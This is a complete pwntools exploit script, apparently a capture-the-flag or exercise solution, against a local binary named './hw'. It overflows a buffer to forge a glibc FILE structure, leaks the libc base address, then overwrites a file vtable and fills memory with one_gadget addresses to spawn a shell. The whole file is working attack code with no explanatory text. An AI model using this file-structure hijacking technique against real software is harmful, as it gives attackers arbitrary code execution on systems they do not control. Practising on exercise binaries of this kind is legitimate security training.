from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
b 68
"""

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv) > 1:
    p = gdb.debug("./hw", gdbscript=script, level="debug")
else:
    p = process("./hw", level="debug")
    # p = process("./hw", level="info")

# libc = ELF("./libc.so.6")
# if len(sys.argv) > 1:
#     p = gdb.debug("./hw", gdbscript=script, level="debug", env={"LD_PRELOAD": "./libc.so.6"})
# else:
#     p = process("./hw", level="debug", env={"LD_PRELOAD": "./libc.so.6"})

p.sendlineafter("> ", "1")

pl = flat(
    "A"*0x200,
    0, 0x1e1,
    0xFBAD1800, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1,
)
p.sendlineafter("> ", "2")
p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "3")

pl = flat(
    "A"*0x200,
    0, 0x1e1,
    0xFBAD1800, 0,
    0, 0,
)
p.sendlineafter("> ", "2")
p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "3")

p.recv(0x80)
libc_base = u64(p.recv(8)) - libc.symbols["_IO_wfile_jumps"]
_system = libc_base + libc.symbols["system"]
_IO_file_jumps = libc_base + libc.symbols["_IO_file_jumps"]
one_gadget = libc_base + 0xe6c7e
log.info(f"libc: {hex(libc_base)}")
log.info(f"_IO_file_jumps: {hex(_IO_file_jumps)}")
log.info(f"one_gadget: {hex(one_gadget)}")

pl = flat(
    p64(one_gadget) * (0x200 // 8),
    0, 0x1e1,
    0xFBAD1800, 0,
    0, 0,
    0, _IO_file_jumps,
    # _IO_file_jumps+32
)
p.sendlineafter("> ", "2")
p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "3")
gdb.attach(p, gdbscript=script)


p.interactive()
